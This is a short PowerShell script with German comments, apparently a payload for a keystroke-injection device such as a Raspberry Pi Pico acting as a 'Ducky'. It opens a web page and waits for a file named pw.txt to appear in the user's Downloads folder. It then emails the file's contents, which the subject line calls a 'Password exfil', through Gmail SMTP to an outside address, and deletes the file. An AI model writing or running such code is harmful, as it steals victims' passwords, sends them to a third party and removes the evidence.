# Pfad zur zu überprüfenden Datei
$dateiPfad = "C:\Users\marwi\Downloads\pw.txt"

# E-Mail-Konfiguration
$From = "injectionkeystroke@gmail.com"
$To = "maklo119@hhu.de"
$Subject = "Password exfil from $($env:computername)"
$Password = $PW | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password

# Webseite im Standard-Browser öffnen
Start-Process -FilePath "https://marwinkloefer.github.io/DuckyPiPico/"

# Endlosschleife, die auf die Existenz der Datei wartet
while (-not (Test-Path $dateiPfad)) {
    Start-Sleep -Seconds 1
}

# Dateiinhalt auslesen
$content = Get-Content -Path $dateiPfad

Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential

# Datei löschen
Remove-Item -Path $dateiPfad -Force
exit
